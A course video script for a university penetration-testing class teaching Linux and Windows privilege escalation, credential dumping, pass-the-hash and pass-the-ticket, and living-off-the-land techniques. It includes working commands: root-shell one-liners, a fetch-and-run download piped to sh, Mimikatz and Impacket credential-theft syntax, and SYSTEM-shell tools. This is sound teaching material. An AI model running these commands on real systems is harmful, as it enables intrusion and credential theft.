# Video Script: Module 12 — Post-Exploitation & Privilege Escalation

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Estimated Duration: 20–24 minutes

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

## Segment 1 — Introduction (0:00–1:30)

Welcome back to CIS-4333 Penetration Testing. I am Professor Nash, and this is Module 12: Post-Exploitation and Privilege Escalation.

Getting a foothold on a system is only the beginning. In most real-world attacks, the initial access point is a low-privilege user account — perhaps a web application running as `www-data`, a phishing victim without admin rights, or an unprivileged SSH account discovered during credential testing. The attacker's next goal is to elevate privileges and leverage that access to achieve their objectives.

Post-exploitation encompasses everything that happens after initial access: enumerating the environment, escalating privileges, dumping credentials, moving laterally, and identifying valuable data. In this module we focus on the privilege escalation phase on both Linux and Windows, credential dumping techniques, pass-the-hash and pass-the-ticket attacks, and living-off-the-land techniques.

This module aligns with CompTIA PenTest+ Domain 3: Attacks and Exploits.

---

## Segment 2 — Post-Exploitation Goals (1:30–3:00)

When a tester gains initial access, they follow a structured post-exploitation methodology:

First, situational awareness — understand where you are. What user are you running as? What OS and version? What network interfaces exist? What other hosts are reachable?

Second, privilege escalation — elevate from limited user to root or administrator. This unlocks the full range of capabilities on the compromised host.

Third, credential harvesting — extract passwords, hashes, tokens, and keys stored on the system. Credentials often enable access to additional systems.

Fourth, lateral movement — use harvested credentials or techniques like pass-the-hash to access other hosts in the network.

Fifth, data identification — locate sensitive data relevant to the engagement objectives: customer databases, intellectual property, financial records, Active Directory secrets.

Sixth, persistence — if authorized by the Rules of Engagement, establish a mechanism to maintain access across reboots. We cover persistence in Module 13.

---

## Segment 3 — Linux Privilege Escalation (3:00–8:00)

Linux privilege escalation exploits misconfigurations, weak permissions, and software vulnerabilities to gain root access.

### Enumeration First

Never attempt exploitation before thorough enumeration. LinPEAS (Linux Privilege Escalation Awesome Script) automates this process:

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

LinPEAS outputs color-coded results highlighting the most likely escalation paths. Red means critical — investigate those first.

### SUID Binaries

SUID (Set User ID) binaries run with the file owner's permissions instead of the executing user's permissions. If a binary owned by root has the SUID bit set, it runs as root — even when executed by a low-privilege user.

Find SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

GTFOBins (gtfobins.github.io) catalogs legitimate binaries that can be abused for privilege escalation. For example, if `find` has the SUID bit set:

```bash
find . -exec /bin/sh -p \; -quit
```

The `-p` flag preserves the effective UID, giving you a root shell. GTFOBins has escalation techniques for dozens of common binaries.

### Sudo Misconfigurations

Check what commands the current user can run with sudo:

```bash
sudo -l
```

If the output shows `(ALL) NOPASSWD: /usr/bin/vim`, the user can run vim as root without a password. GTFOBins shows that from within vim you can spawn a shell:

```
:!/bin/bash
```

This gives a root shell. Any binary listed in sudo without careful restriction is a potential escalation path.

### Cron Job Exploitation

Cron jobs run on a schedule with specific user permissions. If a cron job runs a script as root, and that script is world-writable, an attacker can replace it with a malicious script:

```bash
ls -la /path/to/cron_script.sh
# If writable:
echo "chmod +s /bin/bash" >> /path/to/cron_script.sh
```

When the cron job next executes, it adds the SUID bit to `/bin/bash`. Then:

```bash
bash -p
```

Opens a root shell.

### Kernel Exploits

If the kernel version is outdated, public exploits may be available. Check the kernel version:

```bash
uname -a
```

Search for CVEs matching the kernel version. `linux-exploit-suggester` automates this:

```bash
./linux-exploit-suggester.sh
```

Kernel exploits are powerful but risky — they can crash the system. Use them only if other methods fail and the client accepts the risk.

### Path Hijacking

If a script running as root calls a binary by name without an absolute path, and the current user can write to a directory in the PATH, they can place a malicious binary with the same name earlier in the path:

```bash
export PATH=/tmp:$PATH
echo '#!/bin/bash\nbash -i' > /tmp/ls
chmod +x /tmp/ls
```

When root's script calls `ls`, it finds the malicious version first.

---

## Segment 4 — Windows Privilege Escalation (8:00–13:00)

Windows privilege escalation leverages service misconfigurations, registry weaknesses, and token manipulation.

### WinPEAS

WinPEAS is the Windows counterpart to LinPEAS. Run it on the compromised host:

```
winpeas.exe
```

It checks for unquoted service paths, weak service permissions, scheduled tasks, registry run key values, AlwaysInstallElevated, and much more.

### Unquoted Service Paths

When a Windows service executable path contains spaces and is not enclosed in quotes, Windows searches each space-delimited component for an executable. If the path is:

```
C:\Program Files\Vulnerable App\service.exe
```

Windows looks for:

```
C:\Program.exe
C:\Program Files\Vulnerable.exe
C:\Program Files\Vulnerable App\service.exe
```

If you can write `C:\Program.exe`, it executes as the service user — which is often `SYSTEM`. Finding unquoted service paths is one of the most common Windows privilege escalation techniques.

```powershell
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v '\"'
```

### Weak Service Permissions

If a low-privilege user has write access to a service binary, they can replace it with a malicious executable. Use `accesschk` from Sysinternals to check service permissions:

```
accesschk64.exe /accepteula -wvcu <username> *
```

Look for `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` for non-administrator users.

### Token Impersonation

Windows access tokens represent a user's security context. The `SeImpersonatePrivilege` privilege allows a process to impersonate another user's token. Many service accounts have this privilege by default.

The Juicy Potato, Rotten Potato, and PrintSpoofer exploits abuse `SeImpersonatePrivilege` to escalate to SYSTEM. PrintSpoofer is the modern technique for Windows Server 2019 and Windows 10:

```
PrintSpoofer.exe -i -c cmd
```

This spawns a SYSTEM-level command prompt.

### AlwaysInstallElevated

If the registry keys `AlwaysInstallElevated` are set to 1 in both HKLM and HKCU, any user can install `.msi` packages with SYSTEM privileges. Check with:

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Create a malicious MSI with msfvenom and install it to get a reverse shell as SYSTEM.

---

## Segment 5 — Credential Dumping (13:00–16:30)

Once you have administrator or root privileges, credential dumping extracts stored credentials for use in lateral movement.

### Mimikatz

Mimikatz is the most powerful Windows credential extraction tool. From an administrative command prompt or a Meterpreter session with admin privileges:

```
sekurlsa::logonpasswords
```

This dumps plaintext passwords and NTLM hashes from LSASS memory. On older Windows versions (before Windows 8.1/Server 2012 R2), plaintext passwords may be present in WDigest credentials. On modern systems, you typically get NTLM hashes.

```
lsadump::sam
```

Dumps the SAM database containing local user password hashes.

```
lsadump::lsa /patch
```

Extracts LSA secrets including service account credentials and cached domain credentials.

### Impacket secretsdump

From the attacker machine (remote credential dumping with valid admin credentials):

```bash
python3 secretsdump.py domain/user:password@target_ip
```

Secretsdump remotely extracts SAM hashes, LSA secrets, and domain cached credentials without needing to run anything on the target system.

### Linux Credential Sources

On Linux, credential hunting targets:

- `/etc/shadow` — hashed passwords for all local accounts (requires root to read)
- `/home/user/.ssh/` — SSH private keys for passwordless authentication
- Configuration files containing database credentials, API keys, or plaintext passwords
- Browser saved passwords and session cookies
- `.bash_history` — commands entered by users, often containing passwords typed as arguments

---

## Segment 6 — Pass-the-Hash and Pass-the-Ticket (16:30–19:30)

### Pass-the-Hash

NTLM authentication in Windows does not require the plaintext password — it only requires the NTLM hash. If you have a user's NTLM hash, you can authenticate as that user without knowing the password.

The pth-suite or Impacket's tools support pass-the-hash. Using psexec via Impacket:

```bash
python3 psexec.py -hashes :NTLM_HASH_HERE administrator@target_ip
```

The `-hashes` flag takes the format `LM:NTLM`. For modern systems the LM hash is typically `aad3b435b51404eeaad3b435b51404ee` (empty). The colon separates LM from NTLM.

Pass-the-hash works against SMB, WMI, RDP (in some configurations), and other NTLM-authenticated services.

### Pass-the-Ticket

Kerberos authentication uses tickets rather than passwords or hashes. Pass-the-ticket injects a valid Kerberos ticket into a session, allowing authentication as that user.

Mimikatz extracts TGTs and service tickets:

```
sekurlsa::tickets /export
```

Then inject a stolen ticket:

```
kerberos::ptt <ticket.kirbi>
```

Golden Ticket attacks forge TGTs using the KRBTGT account's NTLM hash, granting domain-wide access. Silver Ticket attacks forge service tickets using a service account's hash, granting access to specific services.

---

## Segment 7 — Living Off the Land (LOLBAS) (19:30–21:30)

Living off the land techniques use legitimate system binaries and tools to perform attacker tasks, evading detection by security tools that block known malicious executables.

The LOLBAS project (lolbas-project.github.io) documents Windows binaries, scripts, and libraries with unexpected capabilities:

- `certutil.exe`: download files from the internet, base64 encode/decode
- `mshta.exe`: execute remote HTML applications containing scripts
- `regsvr32.exe`: execute remote COM scriptlets
- `rundll32.exe`: execute DLL files with arbitrary exports
- `wmic.exe`: execute arbitrary commands via WMI
- `bitsadmin.exe`: download files using the Background Intelligent Transfer Service

The Linux equivalent is GTFOBins, which catalogs Unix binaries that can be abused for file reads, writes, shell spawning, and network activity using built-in system tools.

LOLBAS techniques are particularly important in environments with strict application whitelisting, because the abused binaries are typically trusted and signed by Microsoft.

---

## Segment 8 — Module Summary (21:30–24:00)

Let us wrap up. In this module you learned:

- Post-exploitation goals: situational awareness, privilege escalation, credential harvesting, lateral movement, data identification
- Linux privilege escalation: SUID binaries via GTFOBins, sudo misconfigurations, cron job exploitation, kernel exploits, path hijacking
- Windows privilege escalation: unquoted service paths, weak service permissions, token impersonation with PrintSpoofer, AlwaysInstallElevated
- Credential dumping: Mimikatz (`sekurlsa::logonpasswords`, `lsadump::sam`), Impacket secretsdump, Linux credential sources
- Pass-the-hash using NTLM hashes with Impacket psexec
- Pass-the-ticket using Mimikatz ticket export and injection
- Living off the land using LOLBAS and GTFOBins to evade detection

Your lab this week uses a TryHackMe room focused on privilege escalation techniques on both Linux and Windows hosts. Your quiz tests your knowledge of specific techniques and their conditions. Your discussion asks you to connect these techniques to real attack campaigns.

See you in Module 13, where we cover maintaining access and pivoting.

---

*End of Module 12 Video Script*
